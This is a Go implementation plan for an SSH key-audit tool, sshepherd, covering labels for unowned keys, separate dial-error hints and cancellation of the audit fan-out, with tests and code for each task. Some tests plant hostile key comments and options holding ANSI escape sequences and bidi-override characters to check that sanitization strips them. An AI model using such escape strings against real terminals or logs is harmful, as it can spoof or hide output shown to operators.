- Hints inside `internal/apply/report.go` (P07) and the `[kind]`/hint split of UX-3 (P07).
- `adopt --partial` exit codes (UX-4/D8, P12) and flag renames (UX-7/D26).
- `--parallel` in follow-up hints (tuning, not correctness).
- Any change to `internal/config/config.go` (P05).
- Anything on hold: prune, `apply --force`, `import --prefer`, key generation/scheduled rotation, move-key, apply wipe/empty-server mode. Nothing here overlaps them. The `--no-apply` change only *omits* emptied servers from a hint, and never adds a way to empty one.

---

### P07 — Readable reports: show what '(unknown)' keys are, single clean error + hint, prompt cancellation

> **Program notes (master plan, revised by the review panel):** Ownership amended: also `internal/audit/errors.go`, `internal/sshconn/errors.go`, `internal/audit/drift_classes_test.go`, for Task 4 `internal/sshconn/hostkey.go`, `sshconn_test.go`, `internal/sshread/integration_test.go`, and for Task 7 one appended test in `internal/sshwrite/sshwrite_test.go`. Two tasks were added: **Task 7** (the ARC-3 write-phase `error_kind` bug, moved from P14 S1) and **Task 8** (H1, the `RewriteRow.Widens` rendering, moved from the W1 integrator). Follow-up F-P07-1 is W1 round-2 lane P07-F1. The `apply_test.go:130` break is a W1 merge fix.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Kind:** fix · **Wave:** 1 · **Depends on:** none

**Goal:** Text reports name unowned keys by their on-server comment. A connection error prints once, cleanly, with its remediation hint on its own line (once per distinct hint) and in a separate JSON `hint` field. Ctrl-C stops audit's fan-out right away with no per-server warning storm.

**Architecture:** The hint moves out of the error message and into a field on `sshconn.Error`. It is exposed through a new `audit.Hinted` interface and `audit.HintOf`, mirroring `audit.KindedError`/`ErrorKindOf`. `internal/audit/report.go` gains four small exported helpers that apply's renderer reuses: `UnknownLabel`, `UnknownOptions`, `ErrorTag` and `Hints`. That keeps one implementation and gives P14 (wave 3) one thing to move into `internal/fleet` later. `audit.Run` gets the same `select` on `ctx.Done()` that `apply.Execute` already has (`internal/apply/exec.go:72-82`). JSON changes are additive only (`hint`, `options`), so both documents stay `"schema": 1`.

**Tech Stack:** Go 1.27, `text/tabwriter`, `encoding/json`, `errors.As`, golden files (`-update`), hermetic `sshtest`, goleak.

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| UX-1 | MEDIUM | Plans and audits label unowned keys a bare `(unknown)` and drop the on-server comment that text mode already has (`internal/apply/report.go:63-75`, `internal/audit/report.go:229-233`, rows at `:130-133`). |
| UX-3 | MEDIUM | The dial error repeats the address (`dial 127.0.0.1:2: dial tcp 127.0.0.1:2: …`, `internal/sshconn/connect.go:199-201`). The bastion hint is baked into the message, so it lands in JSON `error`, in every `warn:` line and in every row. The README samples are not real. apply/revoke text has no `[kind]` tag. |
| COR-7 | LOW | `audit.Run` blocks on `sem <- struct{}{}` with no cancellation check (`internal/audit/audit.go:203-210`). After Ctrl-C every queued server still dials a dead ctx and warns (`audit.go:152`). |

Note: the UX-3 `verifier` text in `findings.json` describes `cmd/sshepherd/editrun.go` (`applyHint`/`printScope`). That is a different issue, it lives in P06's files, and **this package does not cover it**. The UX-3 evidence/fix text is what P07 implements.

#### Files owned

From the package manifest:
- `internal/apply/report.go`, `internal/apply/report_test.go`, `internal/apply/json.go`, `internal/apply/json_test.go`
- `internal/apply/testdata/plan_*.golden`, `internal/apply/testdata/json_*.golden.json`, `internal/apply/testdata/summary_*.golden`
- `internal/audit/audit.go`, `internal/audit/audit_test.go`, `internal/audit/report.go`, `internal/audit/report_test.go`, `internal/audit/json.go`, `internal/audit/json_test.go`, `internal/audit/testdata/*`
- `internal/sshconn/connect.go`, `internal/sshconn/connect_test.go`
- `cmd/sshepherd/json_cmd_test.go`, `cmd/sshepherd/audit_hermetic_test.go`

**Required additions to the manifest.** No other wave-1 package owns these. P11 (wave 2) and P14 (wave 3) touch some of them later, in sequence.
- `internal/audit/errors.go`: the `Hinted` interface and `HintOf`, next to `KindedError`/`ErrorKindOf`.
- `internal/sshconn/errors.go`: the `Hint` field and the `ErrorHint()` method on `sshconn.Error`.
- `internal/audit/drift_classes_test.go`: `TestUnknownErrorKindStaysPlain` reuses `driftResults`, which this package changes to a real dial error, so it needs its own plain-error fixture. It also gets the `HintOf` table test.
- Task 4 only: `internal/sshconn/hostkey.go`, `internal/sshconn/sshconn_test.go` and `internal/sshread/integration_test.go`. These move the host-key hints too.
- Integrator: `README.md`, `CLAUDE.md`, plus one amendment paragraph each in `docs/superpowers/specs/2026-07-16-audit-json-exit-codes-design.md`, `docs/superpowers/specs/2026-11-07-apply-json-design.md` and `docs/superpowers/specs/2026-07-06-audit-slice-design.md` (`:247`, the `(unknown)` decision).

**Must not touch:** `internal/apply/plan.go` and `plan_test.go` (P05), `internal/adopt/*` (P05), `cmd/sshepherd/{apply,audit,adopt,…}.go` and `cmd/sshepherd/apply_test.go` (P06).

#### Execution shape inside the wave

This package is about 400 changed lines. **One agent, sequential tasks** is the recommended shape. If the orchestrator wants parallelism inside P07, use this order:
1. Agent B runs Tasks 1 and 3 (`internal/audit/**`). Its exported helpers are the shared API.
2. Then Agent A (Task 2 plus optional Task 4, `internal/sshconn/**` and `internal/sshread/integration_test.go`) and Agent C (Task 5, `internal/apply/**`) run in parallel.
3. Then Task 6 (`cmd/sshepherd/*_test.go`).

Agents A and C compile against Agent B's API, which is fixed below.

**Fixed API** (exact signatures, all in `internal/audit`):

```go
// errors.go
type Hinted interface {
	error
	ErrorHint() string
}
func HintOf(err error) string // first Hinted in the chain; "" if none / nil

// report.go
func UnknownLabel(k authkeys.Key) string           // `(unknown)` or `(unknown) "alice@laptop"`
func UnknownOptions(k authkeys.Key) string         // "" or ` · options: "from=\"10.0.0.0/8\",no-pty"`
func ErrorTag(err error) (tag string, alert bool)  // "ERROR:" | "ERROR [dial]:"; alert = host-key alert kind
func CleanHint(err error) string                   // HintOf, whitespace-collapsed + sanitize.Remote
type Hints struct{ /* seen set */ }
func (h *Hints) Write(w io.Writer, err error)      // "  hint: …\n" once per distinct CleanHint
```

```go
// internal/sshconn/errors.go
type Error struct {
	Kind audit.ErrorKind
	Err  error
	Hint string // operator remediation, never part of Error()
}
func (e *Error) ErrorHint() string { return e.Hint }
var _ audit.Hinted = (*Error)(nil)

// internal/sshconn/connect.go
const DialHint = "check the host, port, and firewall; hosts reachable only through a bastion (ProxyJump/ProxyCommand) are dialed directly — jump hosts are not supported yet"
```

---

#### Task 1: Show the on-server comment and options beside `(unknown)` (UX-1, audit side + shared helpers)

**Files:**
- Modify: `internal/audit/report.go` (`label` at `:229-238`, unauthorized rows at `:130-134`, duplicates line at `:141`)
- Modify: `internal/audit/json.go` (`jsonKey` at `:79-94`, `jsonKeyFor` at `:206-216`)
- Test: `internal/audit/report_test.go`, `internal/audit/json_test.go`
- Goldens: `internal/audit/testdata/report_drift.golden`, `report_drift_color.golden`

- [ ] **Step 1: Write the failing tests** (append to `internal/audit/report_test.go`)

```go
// TestRenderUnknownKeyShowsComment: an unowned key is labeled with its
// sanitized on-server comment (quoted, capped at 40 runes) and its options
// ride in the status cell; a comment-less key stays a bare (unknown).
func TestRenderUnknownKeyShowsComment(t *testing.T) {
	cfg := reportConfig(t)
	long := strings.Repeat("x", 60)
	reader := &fakeReader{byName: map[string]ReadResult{
		"web-1": {Content: []byte(testkeys.Line(t, 1) + "\n" + testkeys.Line(t, 2) + "\n" +
			`from="10.0.0.0/8",no-pty ` + testkeys.Line(t, 9) + " alice@laptop\n" +
			testkeys.Line(t, 8) + "\n" +
			testkeys.Line(t, 7) + " evil\u202e\x1b[31m\n" +
			testkeys.Line(t, 6) + " " + long + "\n")},
		"web-2": {Content: []byte(testkeys.Line(t, 1) + "\n")},
	}}
	results := Run(context.Background(), cfg, reader, Options{Parallel: 2})
	var buf bytes.Buffer
	Render(&buf, cfg, results, RenderOptions{})
	out := buf.String()
	for _, want := range []string{
		`(unknown) "alice@laptop"`,
		`installed but UNAUTHORIZED · options: "from=\"10.0.0.0/8\",no-pty"`,
		`(unknown) "evil[31m"`,                       // ESC and U+202E stripped, %q-quoted
		`(unknown) "` + strings.Repeat("x", 39) + `…"`, // capped at 40 runes
	} {
		if !strings.Contains(out, want) {
			t.Errorf("report lacks %q:\n%s", want, out)
		}
	}
	if strings.ContainsAny(out, "\x1b\u202e") {
		t.Errorf("hostile comment bytes reached the report:\n%q", out)
	}
	// Seed 8 has no comment: its row's label cell is a bare (unknown).
	if !regexp.MustCompile(`⚠\s+\(unknown\)\s+SHA256:`).MatchString(out) {
		t.Errorf("comment-less unowned key must keep a bare (unknown) label:\n%s", out)
	}
}
```

Append to `internal/audit/json_test.go`:

```go
// TestRenderJSONUnauthorizedOptions: on-server options of an unowned key are
// additive `options` (sanitized), absent when the key has none.
func TestRenderJSONUnauthorizedOptions(t *testing.T) {
	cfg := reportConfig(t)
	reader := &fakeReader{byName: map[string]ReadResult{
		"web-1": {Content: []byte(`no-pty,command="x` + "\u202e" + `" ` + testkeys.Line(t, 9) + " a@b\n" + testkeys.Line(t, 8) + "\n")},
	}, errs: map[string]error{"web-2": errors.New("boom")}}
	var rep jsonReport
	if err := json.Unmarshal(renderJSON(t, cfg, Run(context.Background(), cfg, reader, Options{Parallel: 1})), &rep); err != nil {
		t.Fatal(err)
	}
	u := rep.Servers[0].Keys.Unauthorized
	if len(u) != 2 || !slices.Equal(u[0].Options, []string{"no-pty", `command="x"`}) || u[1].Options != nil {
		t.Errorf("unauthorized = %+v, want options on the first key only, U+202E stripped", u)
	}
}
```

- [ ] **Step 2: Run them and watch them fail**

`rtk proxy go test ./internal/audit/ -run 'TestRenderUnknownKeyShowsComment|TestRenderJSONUnauthorizedOptions' -count=1`

Expected: FAIL. The report lacks `(unknown) "alice@laptop"`, and `jsonKey` has no field `Options`, which is a compile error.

- [ ] **Step 3: Implement** (`internal/audit/report.go`)

```go
// maxLabelComment caps the on-server comment shown beside "(unknown)" so a
// long or hostile comment cannot blow out the label column.
const maxLabelComment = 40

// UnknownLabel labels a key the manifest does not own: "(unknown)" plus its
// sanitized on-server comment, Go-quoted (tabs/quotes stay inert inside the
// tabwriter cell) and capped — the one clue to whose key it is.
func UnknownLabel(k authkeys.Key) string {
	c := sanitize.Remote(strings.Join(strings.Fields(k.Comment), " "))
	if c == "" {
		return "(unknown)"
	}
	if r := []rune(c); len(r) > maxLabelComment {
		c = string(r[:maxLabelComment-1]) + "…"
	}
	return fmt.Sprintf("(unknown) %q", c)
}

// UnknownOptions is the status-cell suffix naming an unowned key's
// on-server options; "" when it has none. The cell is the row's last, which
// tabwriter never pads, so length cannot misalign columns.
func UnknownOptions(k authkeys.Key) string {
	if len(k.Options) == 0 {
		return ""
	}
	return " · options: " + quoteOptions(sanitizeAll(k.Options))
}

func label(cfg *config.Config, k authkeys.Key) string {
	u, ok := cfg.OwnerOf(k.Fingerprint)
	if !ok {
		return UnknownLabel(k)
	}
	…unchanged…
}
```

In the unauthorized row loop (`:130-134`), build the status as `"installed but " + pal.paint(codeYellow, "UNAUTHORIZED") + UnknownOptions(k)`, but only when `cfg.OwnerOf` fails. A known owner's key that is unauthorized on this server keeps today's cell, and `TestRenderUnknownKeyShowsComment`'s sibling `TestRenderUnauthorizedKnownOwnerIsNamed` (`report_test.go:298`) pins that. The import of `internal/sanitize` is already there through `json.go`.

`internal/audit/json.go`: add `Options []string \`json:"options,omitempty"\`` to `jsonKey`, with a doc comment: "additive-optional (schema stays 1): unauthorized keys the manifest does not own, their on-server options, sanitized." In the `r.Diff.Unauthorized` loop (`:192-194`), set `jk.Options = sanitizeAll(k.Options)` only when `len(k.Options) > 0` and `jk.Owner == nil`.

- [ ] **Step 4: Run the tests and watch them pass**

`rtk proxy go test ./internal/audit/ -run 'TestRenderUnknownKeyShowsComment|TestRenderJSONUnauthorizedOptions|TestRenderUnauthorizedKnownOwnerIsNamed|TestRenderColorStrippedEqualsPlain' -count=1` → PASS

- [ ] **Step 5: Regenerate and review goldens**

`go test ./internal/audit/ -run 'TestRenderDrift|TestRenderDriftColorGolden' -update -count=1`, then `git diff internal/audit/testdata/`. The only change allowed in `report_drift.golden`/`_color` is the row `⚠  (unknown) "who@is-this"  SHA256:doxi…  installed but UNAUTHORIZED`, with the label column re-padded on that server's rows. The `*.golden.json` files must not change in this task. The fixture keys carry no options.

---

#### Task 2: One clean dial error, hint as a separate value (UX-3, transport side)

**Files:**
- Modify: `internal/sshconn/errors.go` (`Error` struct at `:17-28`, `classify` at `:31-36`)
- Modify: `internal/sshconn/connect.go` (`:194-202`)
- Modify: `internal/audit/errors.go` (append `Hinted`, `HintOf`)
- Test: `internal/sshconn/connect_test.go` (replace `TestConnectDialRefusedMentionsBastion` at `:273-291`), `internal/audit/drift_classes_test.go` (extend `TestErrorKindOf`'s neighbor)

- [ ] **Step 1: Write the failing tests**

`internal/sshconn/connect_test.go`: replace `TestConnectDialRefusedMentionsBastion` with this.

```go
// TestConnectDialRefusedHintIsSeparate: a refused dial names the address
// once, says "dial" once, carries no hint text in its message, and exposes
// the bastion hint through audit.HintOf.
func TestConnectDialRefusedHintIsSeparate(t *testing.T) {
	l, err := (&net.ListenConfig{}).Listen(context.Background(), "tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := l.Addr().(*net.TCPAddr).Port
	_ = l.Close()
	d := &Dialer{KnownHostsPath: sshtest.KnownHostsFile(t), Creds: &Credentials{AgentSock: sshtest.Agent(t, sshtest.Key(1))}, DialTimeout: time.Second}
	_, err = d.Connect(ctxTimeout(t, 5*time.Second), config.Server{Name: "x", Host: "127.0.0.1", Port: port, User: "u"})
	if err == nil {
		t.Fatal("dial to a closed port succeeded")
	}
	if got := kindOf(t, err); got != audit.ErrorKindDial {
		t.Errorf("kind = %q, want dial", got)
	}
	msg := err.Error()
	addr := "127.0.0.1:" + strconv.Itoa(port)
	if strings.Count(msg, "dial") != 1 || strings.Count(msg, addr) != 1 {
		t.Errorf("message %q: want exactly one \"dial\" and one %q", msg, addr)
	}
	if strings.Contains(msg, "hint") || strings.ContainsAny(msg, "\n") {
		t.Errorf("message %q must not embed the hint", msg)
	}
	if h := audit.HintOf(err); h != DialHint {
		t.Errorf("HintOf = %q, want DialHint", h)
	}
}

// TestDialErr: the address is added only when the net error does not
// already name it (a DNS failure names the host, not host:port).
func TestDialErr(t *testing.T) {
	refused := &net.OpError{Op: "dial", Net: "tcp", Addr: &net.TCPAddr{IP: net.IPv4(10, 0, 0, 1), Port: 22},
		Err: os.NewSyscallError("connect", syscall.ECONNREFUSED)}
	lookup := &net.OpError{Op: "dial", Net: "tcp", Err: &net.DNSError{Err: "no such host", Name: "web-1.invalid"}}
	for _, tt := range []struct {
		name, addr string
		in         error
		want       string
	}{
		{"refused names addr", "10.0.0.1:22", refused, "dial tcp 10.0.0.1:22: connect: connection refused"},
		{"lookup gets addr", "web-1.invalid:22", lookup, "dial web-1.invalid:22: dial tcp: lookup web-1.invalid: no such host"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := dialErr(tt.addr, tt.in).Error(); got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}
```

`internal/audit/drift_classes_test.go`: add the test helper and table below, and rewrite `TestUnknownErrorKindStaysPlain` (`:105-112`) so it builds its own result `{Server: cfg.Servers[1], Err: errors.New("boom")}` instead of using `driftResults`.

```go
// hintedErr is a reader error carrying kind and hint, the way sshconn.Error does.
type hintedErr struct {
	kindedErr
	hint string
}

func (e hintedErr) ErrorHint() string { return e.hint }

func TestHintOf(t *testing.T) {
	h := hintedErr{kindedErr{ErrorKindDial, "dial tcp x: refused"}, "check the firewall"}
	for _, tt := range []struct {
		name string
		err  error
		want string
	}{
		{"nil", nil, ""},
		{"plain", errors.New("boom"), ""},
		{"hinted", h, "check the firewall"},
		{"hinted behind wrappers", fmt.Errorf("read: %w", h), "check the firewall"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := HintOf(tt.err); got != tt.want {
				t.Errorf("HintOf = %q, want %q", got, tt.want)
			}
		})
	}
}
```

- [ ] **Step 2: Run them and watch them fail**

`rtk proxy go test ./internal/sshconn/ ./internal/audit/ -run 'TestConnectDialRefusedHintIsSeparate|TestDialErr|TestHintOf' -count=1`

Expected: a compile failure (`undefined: DialHint`, `dialErr`, `HintOf`). After stubs, the assertions fail with "dial" counted twice and the hint embedded.

- [ ] **Step 3: Implement**

`internal/audit/errors.go` (append):

```go
// Hinted is implemented by reader errors that carry operator remediation
// separately from the message (sshconn.Error). The hint never appears in
// Error(): reports print it on its own line, once, and JSON carries it as
// `hint`, so `error` stays groupable.
type Hinted interface {
	error
	ErrorHint() string
}

// HintOf returns the first non-empty hint in err's chain; "" if none.
func HintOf(err error) string {
	var h Hinted
	if errors.As(err, &h) {
		return h.ErrorHint()
	}
	return ""
}
```

`internal/sshconn/errors.go`: add the `Hint string` field, `func (e *Error) ErrorHint() string { return e.Hint }`, `var _ audit.Hinted = (*Error)(nil)` and:

```go
// classifyHint is classify with operator remediation kept out of the message.
func classifyHint(kind audit.ErrorKind, hint string, err error) error {
	if err == nil {
		return nil
	}
	return &Error{Kind: kind, Err: err, Hint: hint}
}
```

`internal/sshconn/connect.go`: replace `:194-202` with the following, and add `DialHint` from the fixed API next to it.

```go
	if err != nil {
		kind, hint := audit.ErrorKindDial, DialHint
		if ctx.Err() != nil {
			kind = ctxKind(ctx)
			if kind == audit.ErrorKindCanceled {
				hint = "" // the operator interrupted; there is nothing to fix
			}
		}
		return nil, classifyHint(kind, hint, dialErr(addr, err))
	}
```

```go
// dialErr names addr only when the net error does not already: a refused or
// timed-out dial reads "dial tcp 10.0.0.1:22: connect: connection refused",
// while a DNS failure names the host but not the port.
func dialErr(addr string, err error) error {
	if strings.Contains(err.Error(), addr) {
		return err
	}
	return fmt.Errorf("dial %s: %w", addr, err)
}
```

- [ ] **Step 4: Run the tests and watch them pass**

`rtk proxy go test ./internal/sshconn/ ./internal/audit/ -count=1` → PASS. The `TestErrorKindOf` "net dial" case still holds.

---

#### Task 3: Render the hint once, show it in JSON, stop the fan-out on cancel (UX-3 audit side, COR-7)

**Files:**
- Modify: `internal/audit/report.go` (`renderServer` `:95-110`, `Render` `:82-93`)
- Modify: `internal/audit/json.go` (`jsonServer` `:39-62`, `jsonServerFor` `:161-169`)
- Modify: `internal/audit/audit.go` (`auditOne` `:148-155`, `Run` `:203-211`)
- Test: `internal/audit/report_test.go` (`driftResults` fixture `:60-74`), `internal/audit/json_test.go`, `internal/audit/audit_test.go`
- Goldens: `report_drift.golden`, `report_drift_color.golden`, `report_drift.golden.json`, and a new `report_hints.golden`

- [ ] **Step 1: Write the failing tests**

`internal/audit/report_test.go`. Make `driftResults`' web-2 a real-shaped dial failure. `testDialHint` must stay byte-identical to `sshconn.DialHint`, and a guard test in Task 2's package checks that (Step 5).

```go
// testDialHint mirrors sshconn.DialHint (audit cannot import sshconn);
// internal/sshconn's TestAuditGoldenCarriesDialHint pins the two equal.
const testDialHint = "check the host, port, and firewall; hosts reachable only through a bastion (ProxyJump/ProxyCommand) are dialed directly — jump hosts are not supported yet"

// dialRefused is the error sshconn returns for a refused TCP connect.
func dialRefused(ip string) error {
	return hintedErr{kindedErr{ErrorKindDial, (&net.OpError{Op: "dial", Net: "tcp",
		Addr: &net.TCPAddr{IP: net.ParseIP(ip), Port: 22},
		Err:  os.NewSyscallError("connect", syscall.ECONNREFUSED)}).Error()}, testDialHint}
}
```

In `driftResults`, set `errs: map[string]error{"web-2": dialRefused("10.0.0.2")}`. Then add:

```go
// TestRenderHintOncePerDistinctHint: two servers failing the same way print
// the [kind] head each and the hint line once; a different hint prints too.
func TestRenderHintOncePerDistinctHint(t *testing.T) {
	cfg := fleetConfig(t, 3)
	reader := &fakeReader{errs: map[string]error{
		"srv-00": dialRefused("10.0.0.1"),
		"srv-01": dialRefused("10.0.0.2"),
		"srv-02": hintedErr{kindedErr{ErrorKindHostKeyChanged, "ssh deploy@10.0.0.3:22: knownhosts: key mismatch"}, "HOST KEY CHANGED for 10.0.0.3:22"},
	}}
	var buf bytes.Buffer
	Render(&buf, cfg, Run(context.Background(), cfg, reader, Options{Parallel: 1}), RenderOptions{})
	out := buf.String()
	if n := strings.Count(out, "  hint: "+testDialHint+"\n"); n != 1 {
		t.Errorf("dial hint printed %d times, want 1:\n%s", n, out)
	}
	if n := strings.Count(out, "ERROR [dial]: dial tcp 10.0.0."); n != 2 {
		t.Errorf("want two [dial] heads, got %d:\n%s", n, out)
	}
	if !strings.Contains(out, "  hint: HOST KEY CHANGED for 10.0.0.3:22\n") {
		t.Errorf("a distinct hint must still print:\n%s", out)
	}
	checkGolden(t, "report_hints.golden", buf.Bytes())
}
```

`internal/audit/json_test.go`:

```go
// TestRenderJSONHintField: hint is additive and separate — error holds only
// the error, hint the sanitized remediation, absent when there is none.
func TestRenderJSONHintField(t *testing.T) {
	cfg := reportConfig(t)
	hostile := hintedErr{kindedErr{ErrorKindDial, "dial tcp 10.0.0.2:22: connect: connection refused"}, "fix\nit \x1b[31mnow\u202e"}
	var rep jsonReport
	raw := renderJSON(t, cfg, []ServerResult{{Server: cfg.Servers[0], Err: hostile}, {Server: cfg.Servers[1], Err: errors.New("boom")}})
	if err := json.Unmarshal(raw, &rep); err != nil {
		t.Fatal(err)
	}
	s0, s1 := rep.Servers[0], rep.Servers[1]
	if *s0.Error != "dial tcp 10.0.0.2:22: connect: connection refused" || s0.ErrorKind != "dial" || s0.Hint != "fix it [31mnow" {
		t.Errorf("server 0 = error %q kind %q hint %q", *s0.Error, s0.ErrorKind, s0.Hint)
	}
	if s1.Hint != "" || bytes.Count(raw, []byte(`"hint"`)) != 1 {
		t.Errorf("hint must be omitted when the error carries none:\n%s", raw)
	}
}
```

`internal/audit/audit_test.go` (COR-7):

```go
// countingReader counts reads; any read after cancellation is a wasted dial.
type countingReader struct{ calls atomic.Int32 }

func (c *countingReader) ReadAuthorizedKeys(ctx context.Context, _ config.Server) (ReadResult, error) {
	c.calls.Add(1)
	return ReadResult{}, fmt.Errorf("read: %w", ctx.Err())
}

// TestRunPreCanceledReadsNothing: a run whose ctx is already canceled takes
// no slot, dials nothing, and marks every server canceled without a warning.
func TestRunPreCanceledReadsNothing(t *testing.T) {
	cfg := fleetConfig(t, 50)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	r := &countingReader{}
	var logBuf bytes.Buffer
	log := slog.New(clog.NewHandler(&logBuf, clog.Options{Level: slog.LevelDebug}))
	results := Run(ctx, cfg, r, Options{Parallel: 1, Logger: log})
	if n := r.calls.Load(); n != 0 {
		t.Errorf("reader called %d times on a canceled run, want 0", n)
	}
	for _, res := range results {
		if ErrorKindOf(res.Err) != ErrorKindCanceled {
			t.Fatalf("%s: err %v (kind %q), want canceled", res.Server.Name, res.Err, ErrorKindOf(res.Err))
		}
	}
	if strings.Contains(logBuf.String(), "warn:") {
		t.Errorf("canceled servers must not warn:\n%s", logBuf.String())
	}
}

// cancelingReader cancels the run from inside the first read (Ctrl-C
// mid-fan-out) and reports the canceled ctx, like sshconn would.
type cancelingReader struct {
	countingReader
	cancel context.CancelFunc
}

func (c *cancelingReader) ReadAuthorizedKeys(ctx context.Context, srv config.Server) (ReadResult, error) {
	c.cancel()
	return c.countingReader.ReadAuthorizedKeys(ctx, srv)
}

func TestRunCancelMidFanOutStopsQueue(t *testing.T) {
	cfg := fleetConfig(t, 50)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	r := &cancelingReader{cancel: cancel}
	var logBuf bytes.Buffer
	log := slog.New(clog.NewHandler(&logBuf, clog.Options{Level: slog.LevelDebug}))
	Run(ctx, cfg, r, Options{Parallel: 1, Logger: log})
	if n := r.calls.Load(); n != 1 {
		t.Errorf("reads = %d, want 1 (queued servers must not dial after Ctrl-C)", n)
	}
	if strings.Contains(logBuf.String(), "warn:") {
		t.Errorf("canceled reads must not warn:\n%s", logBuf.String())
	}
}
```

Keep `TestRunLogsPerServer` (`:238`). Non-canceled failures still warn, but its assertion must change to the new message. Its fixture is `errors.New("dial tcp: connection refused")`, so it does not change.

- [ ] **Step 2: Run them and watch them fail**

`rtk proxy go test ./internal/audit/ -run 'TestRenderHintOncePerDistinctHint|TestRenderJSONHintField|TestRunPreCanceledReadsNothing|TestRunCancelMidFanOutStopsQueue' -count=1`

Expected: FAIL. There is no hint line, `jsonServer` has no field `Hint`, the pre-canceled run reads 50 times (one slot at a time) and `warn:` lines appear.

- [ ] **Step 3: Implement**

`internal/audit/report.go`:

```go
// ErrorTag is the head of an unreachable server's row: "ERROR [kind]:" for
// a classified failure, plain "ERROR:" otherwise. alert marks a host-key
// alert (changed or @revoked), painted bold red by both reports.
func ErrorTag(err error) (tag string, alert bool) {
	kind := ErrorKindOf(err)
	if kind == "" || kind == ErrorKindUnknown {
		return "ERROR:", false
	}
	return "ERROR [" + string(kind) + "]:", hostKeyAlert(kind)
}

// CleanHint is err's hint on one sanitized line, the form both reports print
// and JSON carries. Hints are built locally, but they quote the configured
// host and the known_hosts path, so they get the same boundary as error text.
func CleanHint(err error) string {
	return sanitize.Remote(strings.Join(strings.Fields(HintOf(err)), " "))
}

// Hints prints each distinct remediation hint once per report, on its own
// indented line under the first server that needs it. A fleet-wide outage
// gets one bastion hint, not N. Per-host hints such as host-key changes are
// distinct by text and still print per server. The zero value is ready.
type Hints struct{ seen map[string]bool }

func (h *Hints) Write(w io.Writer, err error) {
	hint := CleanHint(err)
	if hint == "" || h.seen[hint] {
		return
	}
	if h.seen == nil {
		h.seen = make(map[string]bool)
	}
	h.seen[hint] = true
	fmt.Fprintf(w, "  hint: %s\n", hint)
}
```

`renderServer` takes a `*Hints`, which `Render` creates once per call, and its error branch becomes:

```go
	if r.Err != nil {
		tag, alert := ErrorTag(r.Err)
		code := codeRed
		if alert {
			code = codeBoldRed
		}
		fmt.Fprintf(w, "%s  %s %s\n", head, pal.paint(code, tag), oneLine(r.Err))
		hints.Write(w, r.Err) // plain text: no new SGR, color-stripped == plain holds
		return
	}
```

`internal/audit/json.go`: add `Hint string \`json:"hint,omitempty"\`` right after `ErrorKind`, with the doc comment: "additive-optional (schema stays 1): operator remediation for error, sanitized; never part of error." Set it in the `r.Err != nil` branch with `s.Hint = CleanHint(r.Err)`. JSON does not deduplicate: each server object stays self-contained.

`internal/audit/audit.go`: in `auditOne` (`:149-155`), warn only when the error is not a cancellation.

```go
	if err != nil {
		// Live telemetry for real failures. A canceled read is the operator's
		// own Ctrl-C: the command exits 3 with one "interrupted" line, so a
		// warning per queued server would only bury it.
		if ErrorKindOf(err) != ErrorKindCanceled {
			log.Warn(fmt.Sprintf("%s: %v", srv.Name, err))
		}
		res.Err = err
		return res
	}
```

`Run` (`:203-211`) mirrors `apply.Execute`:

```go
		go func() {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
			case <-ctx.Done():
				results[i] = canceledResult(cfg, srv, ctx)
				return
			}
			defer func() { <-sem }()
			if ctx.Err() != nil { // both select cases were ready
				results[i] = canceledResult(cfg, srv, ctx)
				return
			}
			results[i] = auditOne(ctx, cfg, reader, srv, opts.PerServerTimeout, log)
		}()
```

```go
// canceledResult is a server the run never read because ctx ended first.
// ErrorKindOf classifies the wrapped context error (canceled or timeout),
// so callers (cmd's interrupted(), apply's plan) see the same kind a read
// cut short would have produced.
func canceledResult(cfg *config.Config, srv config.Server, ctx context.Context) ServerResult {
	return ServerResult{
		Server:         srv,
		NoUsersGranted: len(cfg.DesiredFor(srv.Name)) == 0,
		Err:            fmt.Errorf("not read: %w", ctx.Err()),
	}
}
```

The `contextcheck`/`revive` linters may ask for `ctx` as the first parameter, so order the parameters `(ctx, cfg, srv)` if lint complains.

- [ ] **Step 4: Run the tests and watch them pass**

`rtk proxy go test -race ./internal/audit/ -count=1` → PASS. `TestRunPoolCap`, `TestRunHangingServerDoesNotPoisonOthers` and `TestRunLogsPerServer` must stay green.

- [ ] **Step 5: Regenerate and review goldens, and pin the hint text**

`go test ./internal/audit/ -update -count=1`, then `git diff internal/audit/testdata/`. Expected deltas:
- `report_drift.golden`: `web-2 (deploy@10.0.0.2:22)  ERROR [dial]: dial tcp 10.0.0.2:22: connect: connection refused`, followed by `  hint: check the host, port, and firewall; …`.
- `report_drift_color.golden`: the same, with `ERROR [dial]:` painted `0;31`.
- `report_drift.golden.json`: `"error": "dial tcp 10.0.0.2:22: connect: connection refused"`, `"error_kind": "dial"` and a new `"hint"`.
- `report_hints.golden`: new.

Nothing else may change. `report_error_kinds.*` changes only in Task 4.

Add the guard to `internal/sshconn/connect_test.go`:

```go
// TestAuditGoldenCarriesDialHint: audit's goldens (and the README samples
// copied from them) use a mirror of DialHint; this keeps the mirror honest.
func TestAuditGoldenCarriesDialHint(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "audit", "testdata", "report_drift.golden"))
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(b, []byte("  hint: "+DialHint+"\n")) {
		t.Error("internal/audit/testdata/report_drift.golden does not carry sshconn.DialHint verbatim; update testDialHint in internal/audit/report_test.go")
	}
}
```

---

#### Task 4: Host-key hints use the same field (UX-3 consistency; can be split off)

Without this task, JSON `hint` exists only for dial errors. The host-key remediation, including the `HOST KEY CHANGED` alarm text, stays inside `error`, which breaks the rule that `error` holds only the error. This task is independent of Tasks 1, 3 and 5. If the wave-1 integrator wants a smaller diff, defer it to wave 2 as its own micro-package. No wave-2 package owns `hostkey.go`.

